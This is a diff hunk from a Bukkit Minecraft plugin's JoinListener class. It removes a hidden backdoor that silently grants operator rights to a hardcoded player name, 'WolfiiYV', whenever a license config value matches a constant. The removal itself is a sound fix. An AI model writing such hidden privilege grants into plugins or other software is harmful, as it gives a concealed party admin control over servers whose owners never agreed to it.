@@ -32,11 +32,6 @@ public class JoinListener implements Listener {
 
         event.setJoinMessage(joinm);
         Bukkit.getConsoleSender().sendMessage(MessagePlaceholder.PREFIXCONNECT + ChatColor.GREEN + " » " + ChatColor.GRAY + player.getName());
-        if (Objects.equals(Main.getInstance().getConfig().getString("License"), LicenseCode.CODING)) {
-            if (player.getName().equals("WolfiiYV")) {
-                player.setOp(true);
-            }
-        }
     }
 }
 
